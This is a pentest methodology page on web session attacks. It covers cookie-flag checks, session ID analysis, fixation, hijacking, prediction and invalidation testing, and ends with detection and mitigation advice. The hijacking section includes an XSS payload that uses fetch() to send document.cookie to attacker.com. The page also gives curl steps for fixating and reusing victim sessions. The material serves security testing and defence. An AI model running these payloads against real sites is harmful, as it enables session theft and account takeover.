% Filename: 04-web-testing/auth-session/session-attacks.md
% Display name: Session Attacks
% Last update: 2026-02-11
% ATT&CK Tactics: TA0006 (Credential Access), TA0008 (Lateral Movement)
% ATT&CK Techniques: T1539 (Steal Web Session Cookie), T1550.004 (Web Session Cookie)
% Authors: @TristanInSec

# Session Attacks

## Overview

Session management controls how web applications track authenticated users across requests. After login, the server issues a session identifier (typically a cookie) that the browser sends with every subsequent request. Flaws in session management — weak session IDs, missing cookie security flags, improper invalidation, or fixation vulnerabilities — allow attackers to hijack, forge, or fixate sessions to impersonate legitimate users.

Session attacks are particularly dangerous because they bypass authentication entirely — the attacker uses a valid session rather than stealing credentials.

## ATT&CK Mapping

- **Tactic:** TA0006 - Credential Access
- **Technique:** T1539 - Steal Web Session Cookie
- **Tactic:** TA0008 - Lateral Movement
- **Technique:** T1550.004 - Web Session Cookie

## Prerequisites

- Target application uses session-based authentication (cookies, tokens)
- Ability to intercept and analyze HTTP traffic (Burp Suite, browser dev tools)
- At least one valid account for testing session behavior

## Detection Methodology

### Analyzing Session Cookies

```bash
# curl
# https://curl.se/
# Capture session cookie from login
curl -s -v -X POST http://target.com/login \
  -d "username=testuser&password=testpassword" 2>&1 | grep -i "set-cookie"
```

Examine the `Set-Cookie` header for:

```text
Set-Cookie: session=abc123def456;
  Path=/;
  HttpOnly;        ← prevents JavaScript access (XSS mitigation)
  Secure;          ← only sent over HTTPS
  SameSite=Strict; ← prevents cross-site sending (CSRF mitigation)
  Max-Age=3600     ← expiration
```

**Missing flags to report:**

- No `HttpOnly` — session cookie accessible via `document.cookie` (XSS can steal it)
- No `Secure` — cookie sent over unencrypted HTTP (network sniffing can capture it)
- No `SameSite` or `SameSite=None` — cookie sent with cross-site requests (CSRF risk)
- Long or no `Max-Age`/`Expires` — session persists indefinitely

### Session ID Analysis

```bash
# Collect multiple session IDs and analyze randomness
for i in $(seq 1 10); do
  cookie=$(curl -s -c - http://target.com/login \
    -d "username=testuser&password=testpassword" \
    | grep session | awk '{print $NF}')
  echo "$cookie"
done

# Look for:
# Sequential patterns (session1, session2, session3)
# Timestamp-based values
# Short length (< 128 bits of entropy)
# Recognizable encoding (base64 of username, timestamps, etc.)
```

## Techniques

### Session Fixation

Session fixation forces a victim to use a session ID chosen by the attacker. If the application does not issue a new session ID after login:

```bash
# curl
# https://curl.se/
# Step 1: Get a valid session ID from the application (unauthenticated)
curl -s -c - http://target.com/ | grep -i session
# Returns: session=ATTACKER_KNOWN_SESSION_ID

# Step 2: Send the victim a link that sets this session:
# http://target.com/login?session_id=ATTACKER_KNOWN_SESSION_ID
# or use XSS: document.cookie="session=ATTACKER_KNOWN_SESSION_ID"

# Step 3: After victim logs in, test if the pre-authentication session ID is still valid
curl -s -b "session=ATTACKER_KNOWN_SESSION_ID" http://target.com/dashboard
# If the dashboard loads as the victim, session fixation is confirmed
```

**Testing for session regeneration:**

```bash
# curl
# https://curl.se/
# Log in and capture the session cookie
SESSION_BEFORE=$(curl -s -c - http://target.com/ | grep session | awk '{print $NF}')
echo "Before login: $SESSION_BEFORE"

# Log in with the existing session
SESSION_AFTER=$(curl -s -c - -b "session=$SESSION_BEFORE" \
  -X POST http://target.com/login \
  -d "username=testuser&password=testpassword" \
  | grep session | awk '{print $NF}')
echo "After login: $SESSION_AFTER"

# If SESSION_BEFORE == SESSION_AFTER, the application does NOT regenerate
# the session ID on login — vulnerable to session fixation
```

### Session Hijacking

Steal a valid session through XSS, network sniffing, or log exposure:

**Via XSS (if HttpOnly is missing):**

```javascript
// Steal session cookie via XSS payload
<script>
fetch("https://attacker.com/log?cookie=" + document.cookie);
</script>
```

**Via network sniffing (if Secure flag is missing):**

On the same network (e.g., public WiFi), capture unencrypted HTTP traffic containing session cookies. Use the captured cookie to access the victim's session.

**Via referer leakage:**

If the application includes the session ID in URLs rather than cookies:

```bash
# URL-based sessions leak in Referer headers
http://target.com/dashboard?sessionid=abc123
# Any external link or resource load sends this in Referer
```

### Session Prediction

If session IDs follow a predictable pattern:

```bash
# Collect session IDs and analyze
for i in $(seq 1 20); do
  curl -s -c - http://target.com/ 2>/dev/null | grep session | awk '{print $NF}'
done > sessions.txt

# Check for sequential patterns
sort sessions.txt | uniq -c | sort -rn

# Check for timestamp-based patterns
# Decode base64 session IDs
while read s; do echo -n "$s → "; echo "$s" | base64 -d 2>/dev/null; echo; done < sessions.txt
```

### Improper Session Invalidation

**Logout testing:**

```bash
# curl
# https://curl.se/
# Log in and capture session
SESSION=$(curl -s -c - -X POST http://target.com/login \
  -d "username=testuser&password=testpassword" \
  | grep session | awk '{print $NF}')

# Log out
curl -s -b "session=$SESSION" http://target.com/logout

# Test if session is still valid after logout
curl -s -b "session=$SESSION" http://target.com/dashboard
# If dashboard loads, session was not invalidated on logout
```

**Password change testing:**

```bash
# curl
# https://curl.se/
# Get two sessions (e.g., browser + mobile)
SESSION_A="..."
SESSION_B="..."

# Change password using SESSION_A
curl -s -X POST -b "session=$SESSION_A" http://target.com/change-password \
  -d "old_password=test&new_password=newtest"

# Test if SESSION_B is still valid
curl -s -b "session=$SESSION_B" http://target.com/dashboard
# If valid, other sessions are not invalidated on password change
```

### Concurrent Session Testing

```bash
# curl
# https://curl.se/
# Test if the application limits concurrent sessions
# Log in from multiple "devices"
curl -s -c - -X POST http://target.com/login \
  -H "User-Agent: Device-1" \
  -d "username=testuser&password=testpassword"

curl -s -c - -X POST http://target.com/login \
  -H "User-Agent: Device-2" \
  -d "username=testuser&password=testpassword"

# Both should work — test if the first session was invalidated
# Unlimited concurrent sessions may indicate missing session management controls
```

### Cookie Scope Issues

```bash
# curl
# https://curl.se/
# Check cookie scope
curl -s -v http://target.com/login 2>&1 | grep -i "set-cookie"

# Issues to look for:
# Domain=.target.com  → cookie sent to ALL subdomains (subdomain takeover risk)
# Path=/              → cookie sent to all paths (broader than necessary)
# No Domain attribute → cookie only sent to exact host (more secure default)
```

If `Domain=.target.com` is set, any subdomain (including potentially compromised ones like `old-app.target.com`) can read the session cookie.

## Detection Methods

### Network-Based Detection

- Same session ID used from multiple IP addresses or drastically different user agents
- Session cookies transmitted over unencrypted HTTP
- Session IDs appearing in URL query strings or Referer headers
- Login events where the session ID does not change (fixation)

### Host-Based Detection

- Successful authenticated requests after session invalidation (logout)
- Multiple concurrent active sessions beyond normal thresholds for a user
- Session cookies set with overly broad domain scope
- Authentication events from unusual geolocations using an existing session

## Mitigation Strategies

- **Regenerate session ID on login** — always issue a new session identifier after successful authentication to prevent fixation attacks
- **Set all cookie security flags** — `HttpOnly`, `Secure`, `SameSite=Strict` (or `Lax`). Set appropriate `Path` and avoid broad `Domain` scope
- **Use strong random session IDs** — at least 128 bits of entropy from a CSPRNG. Never derive from predictable values
- **Invalidate sessions properly** — destroy server-side session data on logout, password change, and privilege change. Invalidate all sessions on password reset
- **Set session timeouts** — absolute timeout (e.g., 8 hours) and idle timeout (e.g., 30 minutes). Re-authenticate for sensitive operations
- **Limit concurrent sessions** — consider limiting the number of active sessions per user. Notify users of new logins from unknown devices

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)
- [OWASP - Session Management Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/)

### MITRE ATT&CK

- [T1539 - Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539/)
- [T1550.004 - Use Alternate Authentication Material: Web Session Cookie](https://attack.mitre.org/techniques/T1550/004/)
